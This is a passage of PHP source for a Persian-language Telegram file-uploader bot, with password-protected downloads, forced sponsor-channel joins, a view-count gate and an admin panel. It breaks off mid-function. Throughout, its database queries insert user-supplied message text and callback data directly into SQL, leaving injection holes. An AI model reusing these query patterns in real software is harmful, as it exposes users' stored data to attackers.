<?php

ob_start();
$load = sys_getloadavg();
$telegram_ip_ranges = [
    ['lower' => '149.154.160.0', 'upper' => '149.154.175.255'],
    ['lower' => '91.108.4.0',    'upper' => '91.108.7.255'],
];
$ip_dec = (float) sprintf("%u", ip2long($_SERVER['REMOTE_ADDR']));
$ok = false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
    $lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
    $upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
    if ($ip_dec >= $lower_dec and $ip_dec <= $upper_dec) $ok = true;
}
include_once "config.php";
$db = mysqli_connect($databaseHost, $databaseUser, $databasePass, $databaseName, $databasePort);
if (!$ok) die("BOT IS RUNING :)");
error_reporting(0);
date_default_timezone_set('Asia/Tehran');
$date = date('Y/m/d | H:i:s');
#==# functions #==#
function LoLbot($method, $datas = [])
{
   $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}
#==#
function sendMessage($chat_id, $text, $parse_mode = '', $keyboard = '', $message_id = '')
{
    return LoLbot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'disable_web_page_preview' => true,
        'reply_markup' => $keyboard,
        'reply_to_message_id' => $message_id
    ]);
}
#==#
function SendPhoto($chat_id, $photo, $caption, $message_id = '', $parse_mode = '', $keyboard = '')
{
    return LoLbot('SendPhoto', [
        'chat_id' => $chat_id,
        'photo' => $photo,
        'caption' => $caption,
        'reply_markup' => $keyboard,
        'parse_mode' => $parse_mode,
        'reply_to_message_id' => $message_id
    ]);
}

function sendDocument($chat_id, $document, $caption, $message_id = '', $parse_mode = '', $keyboard = '')
{
    return LoLbot('sendDocument', [
        'chat_id' => $chat_id,
        'document' => $document,
        'caption' => $caption,
        'reply_markup' => $keyboard,
        'parse_mode' => $parse_mode,
        'reply_to_message_id' => $message_id
    ]);
}
function sendVideo($chat_id, $video, $caption, $message_id = '', $parse_mode = '', $keyboard = '')
{
    return LoLbot('sendVideo', [
        'chat_id' => $chat_id,
        'video' => $video,
        'caption' => $caption,
        'reply_markup' => $keyboard,
        'parse_mode' => $parse_mode,
        'reply_to_message_id' => $message_id
    ]);
}
function sendVoice($chat_id, $voice, $caption, $message_id = '', $parse_mode = '', $keyboard = '')
{
    return LoLbot('sendVoice', [
        'chat_id' => $chat_id,
        'voice' => $voice,
        'caption' => $caption,
        'reply_markup' => $keyboard,
        'parse_mode' => $parse_mode,
        'reply_to_message_id' => $message_id
    ]);
}
function sendAudio($chat_id, $audio, $caption, $message_id = '', $parse_mode = '', $keyboard = '')
{
    return LoLbot('sendAudio', [
        'chat_id' => $chat_id,
        'audio' => $audio,
        'caption' => $caption,
        'reply_markup' => $keyboard,
        'parse_mode' => $parse_mode,
        'reply_to_message_id' => $message_id
    ]);
}
function sendSticker($chat_id, $sticker, $caption, $message_id = '', $parse_mode = '', $keyboard = '')
{
    return LoLbot('sendSticker', [
        'chat_id' => $chat_id,
        'sticker' => $sticker,
        'caption' => $caption,
        'reply_markup' => $keyboard,
        'parse_mode' => $parse_mode,
        'reply_to_message_id' => $message_id
    ]);
}
#==#
function editMessageText($chat_id, $message_id, $text, $parse_mode = null, $keyboard = null)
{
    LoLbot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'reply_markup' => $keyboard,
        'disable_web_page_preview' => true,

    ]);
}

function editMessageReplyMarkup($chat_id, $message_id, $keyboard)
{
    LoLbot('editMessageReplyMarkup', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'reply_markup' => $keyboard,
    ]);
}
/**/
#==#
function deleteMessage($chat_id, $message_id)
{
    LoLbot('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
    ]);
}
#==#
function ForwardMessage($KojaShe, $AzKoja, $KodomMSG)
{
    return LoLbot('ForwardMessage', [
        'chat_id' => $KojaShe,
        'from_chat_id' => $AzKoja,
        'message_id' => $KodomMSG,
    ]);
}
function answercallbackquery($callback_query_id, $text, $show_alert = true)
{
    LoLbot('answercallbackquery', [
        'callback_query_id' => $callback_query_id,
        'text' => $text,
        'show_alert' => $show_alert
    ]);
}
#==#
function getChatMember($chat_id, $user_id)
{
    return LoLbot('getChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $user_id
    ]);
}
#==#
function exportChatInviteLink($chat_id)
{
    return LoLbot('exportChatInviteLink', [
        'chat_id' => $chat_id,
    ])->result;
}
#==#
function getChat($chat_id)
{
    $result = LoLbot('getChat', [
        'chat_id' => $chat_id,
    ]);
    $invite_link = $result->result->invite_link ?: exportChatInviteLink($chat_id);
    $result->result->invite_link = $invite_link;
    return $result;
}
#==#
function getUserProfilePhotos($from_id)
{
    return LoLbot("getUserProfilePhotos", [
        'user_id' => $from_id
    ])->result;
}
#==#
function isJoin($from_id){

    global $db;
    global $usernamebot;
    $channels_sql = $db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` != 'false'");
    if (mysqli_num_rows($channels_sql) >= 1) {
        while ($id = mysqli_fetch_assoc($channels_sql)) {
            $status = getChatMember($id['type_id'], $from_id)->result->status;
            $result[] = $status;
        }
        if (in_array("left", $result)) {
            return false;
        } else {
            return true;
        }
    } else {
        return true;
    }
}

#==#
function joinSend($from_id, $file = null)
{
    global $db;
    global $usernamebot;
    $lockSQL = $db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` != 'false' ");
    while ($row = mysqli_fetch_assoc($lockSQL)) {
        $lock = getChat($row['type_id']);
        $link = $row['columnTwo'] ?: $lock->result->invite_link;
        $title = $lock->result->title;
        if ($link) {
            if (getChatMember($row['type_id'], $from_id)->result->status == "left") {
                if ($link) {
                    $button[] = [['text' => "$title", 'url' => "$link"]];
                }
            } else continue;
        } else continue;
    }
    $button[] = [['text' => "عضو شدم | دانلود ✅", 'callback_data' => "join_" . $file]];
    $button = json_encode(['inline_keyboard' => $button]);
    sendMessage($from_id, "❓ جهت دانلود فایل مورد نظر ابتدا وارد قفل اسپانسر شوید.\n\n💡 پس عضویت بر روی « عضو شدم » کلیک کنید", "html", $button);

}
#==#
function random($max = 10)
{
    $textChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789';
    $textRandom = '';
    for ($i = 0; $i <= $max; $i++) {
        $textRandom .= $textChar[rand(0, strlen($textChar))];
    }
    return $textRandom;
}
#==#
function convert($size)
{
    return round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . ' ' . ['', 'K', 'M', 'G', 'T', 'P'][$i] . 'B';
}
#==#
function doc($name)
{
    switch ($name) {
        case 'document':
            return "پرونده ( سند )";
            break;
        case 'video':
            return "ویدیو";
            break;
        case 'photo':
            return "عکس";
            break;
        case 'voice':
            return "ویس";
            break;
        case 'audio':
            return "موزیک";
            break;
        case 'sticker':
            return "استیکر";
            break;
        default:
            return "ناشناس ...";
            break;
    }
}
#==# SPAM #==#
function Spam($from_id)
{
    global $db;
    $spam_status = explode('|', mysqli_fetch_assoc($db->query("SELECT * FROM `user` WHERE `from_id` = '$from_id' "))['spam']);
    if ($spam_status) {
        if (strpos($spam_status[0], "spam") !== false) {
            if ($spam_status[1] >= time()) exit(false);
            else $spam_status = [1, time() + 2];
        } elseif (time() < $spam_status[1]) {
            if ($spam_status[0] + 1 > 4) {
                $time = time() + 120;
                $db->query("UPDATE `user` SET `spam` = 'spam|$time' WHERE `from_id` = '$from_id'");
                sendMessage($from_id, "جهت جلوگیری از اسپم ربات شما به مدت 2 دقیقه از ربات ما بلاک  شدید.⏳");
                exit(false);
            } else $spam_status = [$spam_status[0] + 1, $spam_status[1]];
        } else $spam_status = [1, time() + 2];
        $db->query("UPDATE `user` SET `spam` = '$spam_status[0]|$spam_status[1]' WHERE `from_id` = '$from_id'");
    } else {
        $time = time() + 2;
        $db->query("UPDATE `user` SET `spam` = '0|$time' WHERE `from_id` = '$from_id'");
    }
}
#==# Send #==#
function send($from_id, $message_id, $id, $status)
{
    global $db, $usernamebot, $text, $btn_back, $first_name, $btn_home;
    $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'];
    $fileData = $db->query("SELECT * FROM `file` WHERE `id` = '{$id}'");
    if (mysqli_num_rows($fileData)) {
        $file = mysqli_fetch_assoc($fileData);
        if ($file['password'] and $status == 'send') {
            sendMessage($from_id, "▪️ لطفا رمز فایل را ارسال کنید تا فایل برای شما ارسال شود :", "markdown", $btn_back, $message_id);
            $db->query("UPDATE `user` SET `step` = 'password', `getFile` = '$id' WHERE `from_id` = '$from_id'");
            exit(false);
        } else {
            $linkSeenSQL = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'];
            if ($linkSeenSQL and $status != 'seen') {
                $seenTime = time() + 10; // این عدد مقدار به خواب رفتن ربات برای سین زدن پست هاست
                sendMessage($from_id, "▪️ لطفا برای دریافت فایل به کانال زیر رفته و 10 پست اخر آن را مشاهده و سپس دکمه (✅مشاهده کردم) را بزنید :\n $linkSeenSQL \n\n⚠️ توجه کنید که سین پست ها باید به ارامی باشد تا ربات سین شما را دریافت کند.", null, json_encode(['inline_keyboard' => [[['text' => '✅مشاهده کردم', 'callback_data' => 'seenDone_' . $id . '_' . $seenTime]]]]));
            } else {
                if ($status == 'seen') deleteMessage($from_id, $message_id);
                $fileData = $db->query("SELECT * FROM `file` WHERE `id` = '{$id}'");
                $file = mysqli_fetch_assoc($fileData);
                if (in_array($status, ['seen', 'send']) or ($text == $file['password'] and $status == 'pass')) {
                    $fileData = $db->query("SELECT * FROM `file` WHERE `id` = '{$id}'");
                    $sleep = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'del'"))['type_id'] * 60;

                    $caption_set = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnTwo'];
                    while ($file = mysqli_fetch_assoc($fileData)) {
                        $downloads = number_format($file['downloads'] + 1);
                        if ($caption_set == "AllFiles") $caption = $caption_sql;
                        elseif ($caption_set == "noAllFiles") $caption = $file['caption'] ?: $caption_sql;
                        elseif (!$caption_set) $caption = $file['caption'];
                        $msgId = LoLbot("send{$file['type']}", [
                            'chat_id' => $from_id,
                            $file['type'] => $file['file_id'],
                            'caption' => "📥 تعداد دانلود ها : <code>{$downloads}</code>\n{$caption}",
                            'parse_mode' => "html",
                        ])->result->message_id;
                        $timeDel = time() + $sleep;
                        if ($sleep > 0) {
                            $db->query("INSERT INTO `del` (`id`, `from_id`, `message_id`, `timeDel`) VALUES ('$id', '$from_id', '$msgId', '$timeDel')");
                        }
                    }
                    $db->query("UPDATE `file` SET `downloads` = `downloads`+1 WHERE `id` = '$id'");
                    $db->query("UPDATE `user` SET `step` = 'none', `downloads` = `downloads`+1 WHERE `from_id` = '$from_id'");
                    if ($sleep > 0) sendMessage($from_id, "⚠️ توجه کنید که بعد از $sleep ثانیه حذف خواهد شد\nلطفا پیام(های) ارسالی را به پیوی خود بفرستید و انجا مشاهده کنید");
                    $ads = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'"));
                    if ($ads['type_id']) {
                        ForwardMessage($from_id, $ads['columnOne'], $ads['type_id']);
                    }
                } else {
                    sendMessage($from_id, "▪️ پسورد اشتباه است , لطفا پسورد صحیح را ارسال کنید :\n🔸 در صورت نیاز به منوی اصلی روی /start کلیک کنید ... !", "markdown", $btn_back, $message_id);
                    exit(false);
                }
            }
        }
    } else sendMessage($from_id, "👤 سلام `$first_name`\n🤖 به ربات آپلودر خوش امدید!\n\n🏷 آپلود پیشرفته و دائم فایل ها بدون هیچ محدودیت زمانی !\n\n🚦 شما میتوانید ( عکس , فیلم , گیف , استیکر و ... ) در ربات آپلود کنید همراه با نمایش تعداد دانلود های فایل شما ... !\n\n▪️ شما میتوانید تا سقف دو گیگابایت (2GB) فایل آپلود کنید و لینک فایل خودتون رو دریافت کنید و برای دوستان خود ارسال کنید :\n\n🔐 دقت کنید که میتوانید برای لینک فایل های خودتون رمز بگزارید تا هرکسی نتواند فایلتون رو دانلود کنه , برای دسترسی به فایل وقتی که کاربر با لینک دانلود وارد میشود ربات از او رمز رو درخواست میکند در صورت صحیح بودن رمزی که شما برای فایلتون انتخاب کردید فایل برایش ارسال میشود ... !\n\n📤 همین الان یه فایل بفرس تا آپلود بشه و لذتشو ببر !\n\n🤖 @$usernamebot", 'markdown', $btn_home, $message_id);
}
#==# updates #==#
$update = json_decode(file_get_contents('php://input'));
$update1 = file_get_contents('php://input');

$message = $update->message;
$chat_id = $update->message->chat->id ?: $update->callback_query->message->chat->id;
$from_id = $update->message->from->id ?: $update->callback_query->from->id;
$text = $update->message->text ?: $update->channel_post->text;
$first_name = $update->message->from->first_name ?: $update->callback_query->from->first_name;
$last_name = $update->message->from->last_name ?: $update->callback_query->from->last_name;
$username = $update->message->from->username ?: $update->callback_query->from->username;
$type = $update->message->chat->type ?: $update->callback_query->message->chat->type ?: $update->channel_post->chat->type;
$message_id = $update->message->message_id ?: $update->callback_query->message->message_id;
$reply_message_id = $update->message->reply_to_message->message_id ?: $update->callback_query->message->reply_to_message->message_id;
$reply_from_id = $update->message->reply_to_message->chat->id ?: $update->callback_query->message->reply_to_message->chat->id;

$data = $update->callback_query->data;
$callback_query_text = $update->callback_query->message->text;

$gap_id = $update->message->chat->id ?: $update->callback_query->message->chat->id;
$channel_id = $update->channel_post->chat->id;
$channel_message_id = $update->channel_post->message_id;
$callback_query_id = $update->callback_query->id;
$forward_from_chat_id = $update->message->forward_from_chat->id;
$forward_from_chat_title = $update->message->forward_from_chat->title;
$forward_from_chat_type = $update->message->forward_from_chat->type;
$forward_from_chat_username = $update->message->forward_from_chat->username;

$profile = getUserProfilePhotos($from_id)->photos[0][0]->file_id;

$botInfo = LoLbot('getMe')->result;
$usernamebot = $botInfo->username;
$first_namebot = $botInfo->first_name;
$time = time();
#== get data ==#
$db->query("SET NAMES 'utf8'");
$db->set_charset('utf8mb4');

$user_sql = $db->query("SELECT * FROM `user` WHERE `from_id` = '$from_id' LIMIT 1");
$user = mysqli_fetch_assoc($user_sql);
$step = $user['step'];

$admin_sql = $db->query("SELECT `type_id`,`columnOne` FROM `settings` WHERE `type` = 'admin' AND `type_id` = '$from_id' LIMIT 1");
$admins_sql = $db->query("SELECT `type_id`,`columnOne` FROM `settings` WHERE `type` = 'admin'");


#== insert ==#

if(mysqli_num_rows($db->query("SELECT * FROM `send`")) == 0) $db->query("INSERT INTO `send` (`step`, `text`, `from`, `user`) VALUES('', '', '', 0);");
if(mysqli_num_rows($db->query("SELECT * FROM `settings`")) == 0) $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`, `columnTwo`) VALUES ('admin', '$admin', 'main', '');");
if(mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'")) == 0) $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`, `columnTwo`) VALUES ('caption', '', '', '');");
if(mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'")) == 0) $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`, `columnTwo`) VALUES ('seen_link', '', '', '');");
if(mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'")) == 0) $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`, `columnTwo`) VALUES ('ads', '', '', '');");
if(mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'del'")) == 0) $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`, `columnTwo`) VALUES ('del', '', '', '');");



#== buttons ==#
switch (mysqli_num_rows($admin_sql)) {
    case 1:
        $btn_home = json_encode([
            'keyboard' => [
                [['text' => "📤 آپلود 📤"]],
                [['text' => "🔖 آپلود های اخیر 🔖"],['text' => "🔑 تنظیم پسورد 🔑"]],
                [['text' => "⚙️ پنل مدیریت ⚙️"]]
            ], 'resize_keyboard' => true,
               'input_field_placeholder'=>"@PCcodeX"
        ]);
        $panel = json_encode([
            'keyboard' => [
                [['text' => "📊 آمار 📊"]],
                [['text' => "💌 بخش ارسال پیام 💌"], ['text' => "⏳ تنظیم حذف خودکار ⏳"]],
                [['text' => "⛔️ بخش جویین اجباری ⛔️"], ['text' => "🧑🏻‍💻 تنظیم ادمین ها 🧑🏻‍💻"]],
                [['text' => "📣 بخش تبلیغات 📣"]],

                [['text' => "🔙 خروج 🔙"]]
            ], 'resize_keyboard' => true,
                'input_field_placeholder'=>"@PCcodeX"
        ]);
        $back_panel = json_encode([
            'keyboard' => [
                [['text' => "🔙 برگشت 🔙"]]
            ], 'resize_keyboard' => true,
               'input_field_placeholder'=>"@PCcodeX"
        ]);
        break;
        
    default:
        $btn_home = json_encode([
            'keyboard' => [
                [['text' => "📤 آپلود 📤"]],
                [['text' => "🔖 آپلود های اخیر 🔖"],['text' => "🔑 تنظیم پسورد 🔑"]]
            ], 'resize_keyboard' => true,
               'input_field_placeholder'=>"@PCcodeX"
        ]);
        break;
}
#===#
$btn_upload = json_encode([
    'keyboard' => [
                [['text' => "📤 آپلود آلبومی 📤"],['text' => "📤 آپلود تکی 📤"]],
                [['text' => "🔙 برگشت 🔙"]]
    ], 'resize_keyboard' => true,
       'input_field_placeholder'=>"@PCcodeX"
]);
#===#
$btn_back = json_encode([
    'keyboard' => [
        [['text' => "🔙 برگشت 🔙"]]
    ], 'resize_keyboard' => true,
       'input_field_placeholder'=>"@PCcodeX"
]);
#===#
$btn_end = json_encode([
    'keyboard' => [
        [['text' => "✅️ اتمام آپلود آلبومی ✅️"]]
    ], 'resize_keyboard' => true,
       'input_field_placeholder'=>"@PCcodeX"
]);
#===#
$remove = json_encode([
    'remove_keyboard' => [], 'remove_keyboard' => true
]);
#== ("^") ==#
#== add channel  ==#        

if (preg_match('/^\/lock_(.*)/', $text, $match)) {
    $random = $match[1];
    if ($type == "channel") {$lock_id = $channel_id; $lock_message_id = $channel_message_id;}
    elseif ($type == "group" or $type == "supergroup") {$lock_id = $gap_id; $lock_message_id = $message_id;}
    $new_lock_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` = 'false'"));
    if ($random == $new_lock_sql['columnOne']) {
        
        if ($type == "channel" or $type == "group" or $type == "supergroup") {
            if (mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` = '$lock_id'")) == 0) {
                $db->query("UPDATE `settings` SET `type_id`='$lock_id' WHERE `type` = 'lock' AND `type_id` = 'false' AND `columnOne` = '$random'");
                $lock_data = getChat($lock_id)->result;
                $lock_title = $lock_data->title;
                $lock_username = $lock_data->username ?: "ندارد";
                $lock_link = $lock_data->invite_link;
                $admins_sql = $db->query("SELECT * FROM `settings` WHERE `type` = 'admin'");
                while ($row = mysqli_fetch_assoc($admins_sql)){
                    sendMessage($row['type_id'], "✅ قفل با موفقیت اضافه شد. \n\n📑 مشخصات:\n❔ نوع قفل : {$type}\n✏️ نام : {$lock_title}\n👤 نام کاربری : {@$lock_username}\n🔗 لینک : {$lock_link}\n🆔 ایدی عددی قفل : {$lock_id}");
                }
                deleteMessage($lock_id, $lock_message_id);
            }
        } else {
            sendMessage($from_id, "❌ این دستور تنها در کانال یا گروه امکان پذیر است");
        }
    }
}

#== update database database ==#
if (mysqli_num_rows($user_sql) == 0 & $type == "private") $db->query("INSERT INTO `user`(`from_id`, `step`, `downloads`, `getFile`) VALUES ('$from_id', '0', '0', '0')");
$db->query("UPDATE `user` SET `update_at` = '$time' WHERE `from_id` = '$from_id'");
if (!preg_match('/^upload_(.*)/', $step)) { 
    Spam($from_id);
}
#== start ==#
if (preg_match('/^\/start get_(.*)/', $text, $match) or preg_match('/^\/get_(.*)/', $text, $match)) {
    $id = $match[1];
    if (isJoin($from_id)) {
        send($from_id, $message_id, $id, 'send');
    } else joinSend($from_id, $id);
}

#== Seen Done ==#
elseif (preg_match('/^seenDone_(.*)_(.*)/', $data, $match)) {
    if ($match[2] < time()) {
        send($from_id, $message_id, $match[1], 'seen');
    } else answercallbackquery($callback_query_id, "❌ لطفا پست ها را به ارامی مشاهده کنید");
}

#== join ==#
elseif (preg_match('/^join_(.*)/', $data, $match)) {
    if (isJoin($from_id)) {
        deleteMessage($from_id, $message_id);
        $match[1];
        if ($match[1]) {
            send($from_id, null, $match[1], 'send');
        } else sendMessage($from_id, "👤 سلام `$first_name`\n🤖 به ربات آپلودر خوش امدید!\n\n🏷 آپلود پیشرفته و دائم فایل ها بدون هیچ محدودیت زمانی !\n\n🚦 شما میتوانید ( عکس , فیلم , گیف , استیکر و ... ) در ربات آپلود کنید همراه با نمایش تعداد دانلود های فایل شما ... !\n\n▪️ شما میتوانید تا سقف دو گیگابایت (2GB) فایل آپلود کنید و لینک فایل خودتون رو دریافت کنید و برای دوستان خود ارسال کنید :\n\n🔐 دقت کنید که میتوانید برای لینک فایل های خودتون رمز بگزارید تا هرکسی نتواند فایلتون رو دانلود کنه , برای دسترسی به فایل وقتی که کاربر با لینک دانلود وارد میشود ربات از او رمز رو درخواست میکند در صورت صحیح بودن رمزی که شما برای فایلتون انتخاب کردید فایل برایش ارسال میشود ... !\n\n📤 همین الان یه فایل بفرس تا آپلود بشه و لذتشو ببر !\n\n🤖 @$usernamebot", "markdown");
    } else {
        answercallbackquery($callback_query_id, "❌ شما هنوز عضو کانال های ربات نیستید");
        $lockSQL = $db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` != 'false'");
        while ($row = mysqli_fetch_assoc($lockSQL)) {
            $lock = getChat($row['type_id']);
            $link = $row['columnTwo'] ?: $lock->result->invite_link;
            $title = $lock->result->title;
            if ($link) {
                if (getChatMember($row['type_id'], $from_id)->result->status == "left") {
                    if ($link) {
                        $button[] = [['text' => "$title", 'url' => "$link"]];
                    }
                } else continue;
            } else continue;
        }
        $button[] = [['text' => "عضو شدم | دانلود ✅", 'callback_data' => "join_" . $match[1]]];
        $button = json_encode(['inline_keyboard' => $button]);
        editMessageText($from_id, $message_id, "❓ برای استفاده از ربات و آپلود و دریافت فایل عضو کانال های ما شوید.\n\n💡 پس عضویت بر روی « عضو شدم » کلیک کنید", null, $button);
    }
}
#== start ==#
if($type == 'private'){
if($text == '/start' or $text == "🔙 خروج 🔙") {
        $time = date('h:i:s');
        $date = date('Y/m/d');
    sendMessage($from_id, "*سلام* [$first_name](tg://openmessage?user_id=$chat_id) *عزیز*\n\n*جقی عزیز به منطق آپلودر خوش آمدید 😈*\n\n\n*🕛  $date | $time  🕛*\n * 👾 @$usernamebot 👾* ", 'markdown', $btn_home, $message_id);
    $db->query("UPDATE `user` SET `step` = 'none', `getFile` = '' WHERE `from_id` = '$from_id' LIMIT 1");
}
#== back home ==#
elseif ($text == '🔙 برگشت 🔙') {
    sendMessage($from_id, "*🖤 با موفیفت به منوی اصلی برگشتیم 🖤*", 'markdown', $btn_home, $message_id);
    $db->query("UPDATE `user` SET `step` = 'none', `getFile` = '' WHERE `from_id` = '$from_id' LIMIT 1");
    exit(false);
}
#== upload taki ==#
elseif($text == "📤 آپلود تکی 📤") {
    sendMessage($from_id, "*〽️ لطفا فایل خود را ارسال کنید 〽️*", 'markdown', $btn_back, $message_id);
}
#== password ==#
elseif ($step == 'password') {
    $id = $user['getFile'];
    if (isJoin($from_id)) {
        send($from_id, $message_id, $id, 'pass');
    } else joinSend($from_id, $id);
}
#== remove file ==#
elseif ($text == "🗑 حذف فایل") {
    if (isJoin($from_id)) {
        sendMessage($from_id, "▪️لطفا شناسه فایل خود را ارسال کنید :\n📍 توجه کنید که بعد از فرستادن شناسه , فایل همان لحظه پاک میشود پس لطفا الکی شناسه فایلتون رو ارسال نکنید و فقط در صورت نیاز استفاده بکنید از این بخش ... !", 'markdown', $btn_back, $message_id);
        $db->query("UPDATE `user` SET `step` = 'remove' WHERE `from_id` = '$from_id' LIMIT 1");
    } else joinSend($from_id);
}
#===#
elseif ($step == 'remove') {
    if (isJoin($from_id)) {
        $query = mysqli_fetch_assoc($db->query("SELECT * FROM `file` WHERE `user_id` = '{$from_id}' AND `id` = '{$text}'"));
        if ($query) {
            sendMessage($from_id, "✔️ فایل با موفقیت حذف شد ... !", 'markdown', $btn_home, $message_id);
            $db->query("UPDATE `user` SET `downloads` = `downloads` - 1, `step` = 'none'  WHERE `from_id` = '{$from_id}' LIMIT 1");
            $db->query("DELETE FROM `file` WHERE `id` = '{$text}' and `user_id` = '{$from_id}'");
        } else sendMessage($from_id, "▪️ خطا , این فایل در دیتابیس موجود نمیباشد یا فایل مال شخص دیگری میباشد و  شما اجازه دسترسی به این فایل را ندارید ... !", 'markdown', null, $message_id);
    } else joinSend($from_id);
}
#== chek file ==#
elseif ($text == "🗂 کد پیگیری فایل") {
    if (isJoin($from_id)) {
        sendMessage($from_id, "▪️لطفا شناسه فایل خود را ارسال کنید :", 'markdown', $btn_back, $message_id);
        $db->query("UPDATE `user` SET `step` = 'checkfile' WHERE `from_id` = '{$from_id}' LIMIT 1");
    } else joinSend($from_id);
}
#===#
elseif ($step == "checkfile") {
    if (isJoin($from_id)) {
        $queryE = $db->query("SELECT * FROM `file` WHERE `user_id` = '{$from_id}' AND `id` = '{$text}'");
        $query = mysqli_fetch_assoc($queryE);
        if ($query) {
            $file_size = convert($query['file_size']);
            $file = doc($query['type']);
            $time = $query['time'];
            $date = $query['date'];
            $caption = $query['caption'] ?: 'توضیحاتی وجود ندارد ... !';
            $password = $query['password'] ?: 'این فایل بدون رمز عبور است ... !';
            $count = mysqli_num_rows($queryE);
            if ($count = 1) sendMessage($from_id, "▪️ شناسه فایل شما : <code>$text</code>\n\n➖ بقیه اطلاعات فایل شما : \n\n💾  حجم فایل : <b>$file_size</b> \n▪️ نوع فایل : <b>$file</b>\n🔐 رمز فایل : <code>$password</code>\n📝 توضیحات فایل : \n<code>$caption</code>\n🕓 تاریخ و زمان آپلود : <b>" . $date . " - " . $time . "</b>" . "\nلینک شتراک گذاری فایل:\n\n📥 https://t.me/" . $usernamebot . "?start=get_" . $query['id'] . "\n\n🤖 @$usernamebot", "html", $btn_home, $message_id);
            else sendMessage($from_id, "▪️ شناسه فایل های شما : <code>$text</code>\n\n➖ بقیه اطلاعات فایل های شما : \n\n🔐 رمز فایل : <code>$password</code>\n<code>$caption</code>\n🕓 تاریخ و زمان آپلود : <b>" . $date . " - " . $time . "</b>" . "\nلینک شتراک گذاری فایل:\n\n📥 https://t.me/" . $usernamebot . "?start=get_" . $query['id'] . "\n\n🤖 @$usernamebot", "html", $btn_home, $message_id);
            $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '{$from_id}' LIMIT 1");
        } else sendMessage($from_id, "▪️ خطا , این فایل در دیتابیس موجود نمیباشد یا فایل مال شخص دیگری میباشد و  شما اجازه دسترسی به این فایل را ندارید ... !", "markdown", $btn_back, $message_id);
    } else joinSend($from_id);
}
#== edit Caption ==#
elseif (preg_match('/^editCaption_(.*)/', $data, $match)) {
    $id = $match[1];
    if (isJoin($from_id)) {
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `file` WHERE `id` = '$id' LIMIT 1"))['caption'];
        sendMessage($from_id, "کپشن قبلی :\n\n <code>$caption_sql</code> \n\n▪️لطفا کپشن جدید را ارسال کنید :\n( تنها متن میتوانید ارسال کنید ; متن میتواند در قالب html نیز باشد )", 'html', $btn_back, $message_id);
        $db->query("UPDATE `user` SET `step` = 'editCaption_$id' WHERE `from_id` = '$from_id' LIMIT 1");
    } else joinSend($from_id);
}
#===#
elseif (preg_match('/^editCaption_(.*)/', $step, $match)) {
    $id = $match[1];
    if (isJoin($from_id)) {
        if ($text) {
            $db->query("UPDATE `file` SET `caption` = '$text' WHERE `id` = '$id'");
            sendMessage($from_id, "✅ کپشن با موفقیت تنظیم شد.", 'markdown', $btn_home, $message_id);
            $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$from_id' LIMIT 1");
        }
    } else joinSend($from_id);
}
#== del Caption ==#
elseif (preg_match('/^delCaption_(.*)/', $data, $match)) {
    $id = $match[1];
    if (isJoin($from_id)) {
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `file` WHERE `id` = '$id' LIMIT 1"))['caption'];
            if ($caption_sql) {
                $db->query("UPDATE `file` SET `caption` = '' WHERE `id` = '$id'");
                answercallbackquery($callback_query_id, "✅ کپشن با موفقیت حذف شد.");
            } else answercallbackquery($callback_query_id, "❌ فایل شما کپشنی ندارد.");
    } else joinSend($from_id);
}
#== accont ==#
elseif ($text == "🎫 حساب کاربری") {
    if (isJoin($from_id)) {
        $files = $db->query("SELECT * FROM `file` WHERE `user_id` = '$from_id'");
        $countFile = mysqli_num_rows($files) ?: 0;
        $btn_profile = json_encode(['inline_keyboard' => [
            [['text' => "📤 تعداد فایل آپلود شده", 'callback_data' => "countFile"], ['text' => $countFile, 'callback_data' => "countFile"]],
            [['text' => "📲 تعداد دانلود شده", 'callback_data' => "downloads"], ['text' => $user['downloads'], 'callback_data' => "downloads"]],
        ]]);
        if ($profile) {
            LoLbot('SendPhoto', [
                'chat_id' => $from_id,
                'photo' => $profile,
